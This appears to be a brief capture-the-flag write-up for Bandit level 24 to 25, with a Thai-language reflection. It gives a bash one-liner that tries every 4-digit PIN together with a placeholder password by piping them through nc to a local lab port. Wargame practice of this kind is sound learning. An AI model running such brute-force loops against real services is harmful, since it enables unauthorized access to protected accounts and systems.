# Bandit Level 24 → 25

## Objective

Brute-force a 4-digit PIN combined with the current password sent to a specific port.

## Skills Learned

- Bash For-Loops
- Brute-forcing Concepts

## Commands Used

for i in {0000..9999}; do echo "รหัสผ่านเดิม $i"; done | nc localhost 30002

## What I Learned

- การเขียนลูปวนซ้ำ (For-Loop) ในภาษาโครงสร้างของ Bash เพื่อทำหน้าที่สร้างชุดตัวเลขต่อลำดับส่งไปโจมตีพอร์ตเป้าหมายแบบ Brute force (สุ่มรหัสครบทุกหลัก)